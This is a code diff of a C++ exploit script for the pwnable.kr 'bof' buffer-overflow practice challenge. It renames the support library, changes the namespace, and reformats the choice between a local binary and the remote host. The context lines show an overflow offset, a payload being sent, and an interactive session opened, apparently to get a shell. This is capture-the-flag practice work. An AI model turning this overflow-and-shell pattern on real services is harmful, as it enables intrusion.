@@ -1,9 +1,9 @@
-#include <ctf/ctf.hpp>
 #include <exception>
 #include <iostream>
 #include <string_view>
+#include <xcraft/xcraft.hpp>
 
-using namespace ctf;
+using namespace xcft;
 
 constexpr uint16_t PORT   = 9000;
 constexpr uint32_t OFFSET = 0x6161616e;
@@ -18,9 +18,8 @@ int main(int argc, char **argv) try {
 
     using UniqTube = std::unique_ptr<Tube>;
 
-    auto io =
-        local ? uniq_tube<Process>("./bin/bof") // the code from pwnable
-              : uniq_tube<Remote>("pwnable.kr", PORT);
+    auto io = local ? uniq_tube<Process>("./bin/bof") // the code from pwnable
+                    : uniq_tube<Remote>("pwnable.kr", PORT);
 
     io->writeln(payload);
     io->interactive();
